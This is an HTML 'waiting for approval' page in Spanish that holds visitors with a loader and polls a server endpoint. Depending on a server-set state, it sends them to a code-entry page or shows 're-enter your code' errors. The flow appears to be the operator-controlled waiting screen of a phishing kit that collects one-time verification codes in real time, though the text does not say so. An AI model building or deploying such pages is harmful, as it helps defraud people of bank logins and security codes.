<!DOCTYPE html>
<html>
<head>
<title>Esperando aprobación</title>

<style>
body{
  margin:0;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  font-family:Arial, sans-serif;
  background:#f5f7fb;
}

.frm-modal{
  text-align:center;
  background:white;
  padding:40px;
  border-radius:15px;
  box-shadow:0 10px 30px rgba(0,0,0,.1);
  max-width:400px;
}

.frm-modal img{
  margin-top:25px;
}

.text{
  color:#444;
  font-size:16px;
  line-height:1.5;
}
</style>

</head>
<body>

<div id="frm-esperando" class="frm-modal">

  <div class="text">
    Por favor espere un momento estamos validando algunos datos.<br>
    Puede tardar entre 1 a 5 minutos.<br>
    <b>No cierres o recargues esta ventana.</b>
  </div>

  <img src="assets/preloader2.gif" width="200">

</div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script>
const id = localStorage.getItem("id");

async function revisar(){

  if(!id){
    location="index.html";
    return;
  }

  try{
    const r = await fetch("/api/estado/"+id);
    const j = await r.json();

    if(j.estado === "codigo"){
      location="codigo.html";
      return;
    }

    if(j.estado === "index"){
      location="index.html";
      return;
    }

    if(j.estado === "ok"){
      location="Solicitud.html";
      return;
    }

    if(j.estado === "coderr"){
      Swal.fire({
        icon:"error",
        title:"Oopss",
        text:"¡Ingrese nuevamente su código!",
        confirmButtonText:"OK",
        allowOutsideClick:false
      }).then(()=>{
        location="codigo.html";
      });
      return;
    }

    setTimeout(revisar,2000);

  }catch(e){
    setTimeout(revisar,3000);
  }
}

revisar();
</script>

</body>
</html>
